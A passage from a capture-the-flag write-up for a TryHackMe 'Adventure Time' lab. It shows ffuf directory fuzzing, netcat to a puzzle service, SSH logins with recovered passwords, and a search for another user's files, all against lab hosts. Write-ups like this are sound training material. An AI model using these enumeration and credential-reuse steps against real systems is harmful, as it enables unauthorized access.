&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Copyright 2007 James Fisher [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 60ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 63ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 58ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 57ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># on atleast 2 different hosts [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 58ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Priority ordered case insensative list, where entries were found [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 63ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 64ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 63ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># This work is licensed under the Creative Commons [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 60ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 62ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bananastock &lt;span class="o">[&lt;/span>Status: 301, Size: 334, Words: 20, Lines: 10, Duration: 199ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And now we got another code:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled%202.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>This time we got this:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled%203.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>I tried to put that in the service running but no luck:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 10.10.237.150 &lt;span class="m">31337&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">THE BANANAS ARE THE BEST!!!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The magic word is not THE BANANAS ARE THE BEST!!!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So I just started another fuzzer&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u https://land-of-ooo.com/yellowdog/bananastock/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : https://land-of-ooo.com/yellowdog/bananastock/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 63ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 54ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># This work is licensed under the Creative Commons [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 55ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 54ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 68ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 65ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 58ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># on atleast 2 different hosts [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 58ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 58ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Copyright 2007 James Fisher [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Priority ordered case insensative list, where entries were found [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 56ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 328ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">princess &lt;span class="o">[&lt;/span>Status: 301, Size: 343, Words: 20, Lines: 10, Duration: 58ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And finally we got what we were searching:&lt;/p>
&lt;p>&lt;img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/7fecbb84-9598-4ec2-9fa9-5ad99163bcf9/26707c7e-4328-4b37-9e1f-5b3357f3c284/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>This is either AES or DES,&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled%205.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>It was AES.&lt;/p>
&lt;p>And we got that:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 10.10.237.150 &lt;span class="m">31337&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ricardio
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The new username is: apple-guards
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So I tried using ssh with the password that we found before:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh apple-guards@10.10.237.150
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The authenticity of host &lt;span class="s1">&amp;#39;10.10.237.150 (10.10.237.150)&amp;#39;&lt;/span> can&lt;span class="s1">&amp;#39;t be established.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">ED25519 key fingerprint is SHA256:oousiKsHNim8zwOz0eyM11NPdqD8vdPNZ23JWmvYNSM.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">This key is not known by any other names.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Warning: Permanently added &amp;#39;&lt;/span>10.10.237.150&lt;span class="s1">&amp;#39; (ED25519) to the list of known hosts.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">apple-guards@10.10.237.150&amp;#39;&lt;/span>s password:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome to Ubuntu 18.04.3 LTS &lt;span class="o">(&lt;/span>GNU/Linux 4.15.0-62-generic x86_64&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Documentation: https://help.ubuntu.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Management: https://landscape.canonical.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Support: https://ubuntu.com/advantage
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Canonical Livepatch is available &lt;span class="k">for&lt;/span> installation.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - Reduce system reboots and improve kernel security. Activate at:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> https://ubuntu.com/livepatch
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">1&lt;/span> package can be updated.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> updates are security updates.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">No mail.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Last login: Sat Sep &lt;span class="m">21&lt;/span> 20:51:11 &lt;span class="m">2019&lt;/span> from 192.168.245.129
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apple-guards@at:~$ whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apple-guards
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>There there are 2 flags, flag1, and flag, the flag one is encrypted in md5.&lt;/p>
&lt;p>Since the hint tells us: (Can you search for someones files?)&lt;/p>
&lt;p>I searched for the files owned by marceline:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">find / -user marceline 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/etc/fonts/helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/home/marceline
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">======================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> BananaHead Access Pass
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> created by &lt;span class="nv">Marceline&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">======================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hi there bananaheads!!!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">So you found my file?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">But it won&lt;span class="s1">&amp;#39;t help you if you can&amp;#39;&lt;/span>t answer this question correct.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">What? I told you guys I would &lt;span class="nb">help&lt;/span> and that it wouldn&lt;span class="err">&amp;#39;&lt;/span>t cost you a thing....
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Well I lied hahahaha
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Ready &lt;span class="k">for&lt;/span> the question?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The key to solve this puzzle is gone
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">And you need the key to get this readable: Gpnhkse
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Did you solve the puzzle?
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I first tought that was rot13, but after seaching for a while I tried the vigenere one, which requires a key, that in this case would be “gone”&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">What is the word I&lt;span class="s1">&amp;#39;m looking for? Abadeer
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">That&amp;#39;&lt;/span>s it!!!! You solved my puzzle
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Don&lt;span class="s1">&amp;#39;t tell princess B I helped you guys!!!
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">My password is &amp;#39;&lt;/span>My friend Finn&lt;span class="err">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So we got marceline’s password&lt;/p>
&lt;p>And we enter ssh with marceline with the password that we just found.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">marceline@at:~$ ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">flag2 I-got-a-secret.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">marceline@at:~$ cat I-got-a-secret.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hello Finn,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I heard that you pulled a fast one over the banana guards.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">B was very upset hahahahaha.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I also heard you guys are looking &lt;span class="k">for&lt;/span> BMO&lt;span class="s1">&amp;#39;s resetcode.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">You guys broke him again with those silly games?
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">You know I like you Finn, but I don&amp;#39;&lt;/span>t want to anger B too much.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">So I will &lt;span class="nb">help&lt;/span> you a little bit...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">But you have to solve my little puzzle. Think you&lt;span class="err">&amp;#39;&lt;/span>re up &lt;span class="k">for&lt;/span> it?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hahahahaha....I know you are.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">111111111100100010101011101011111110101111111111011011011011000001101001001011111111111111001010010111100101000000000000101001101111001010010010111111110010100000000000000000000000000000000000000010101111110010101100101000000000000000000000101001101100101001001011111111111111111111001010000000000000000000000000001010111001010000000000000000000000000000000000000000000001010011011001010010010111111111111111111111001010000000000000000000000000000000001010111111001010011011001010010111111111111100101001000000000000101001111110010100110010100100100000000000000000000010101110010100010100000000000000010100000000010101111100101001111001010011001010010000001010010100101011100101001101100101001011100101001010010100110110010101111111111111111111111111111111110010100100100000000000010100010100111110010100000000000000000000000010100111111111111111110010100101111001010000000000000001010&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Apparently this is spoon code.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">The magic word you are looking &lt;span class="k">for&lt;/span> is ApplePie
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And finally we got the magic word.&lt;/p>
&lt;p>Which tells us the peppermint password.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
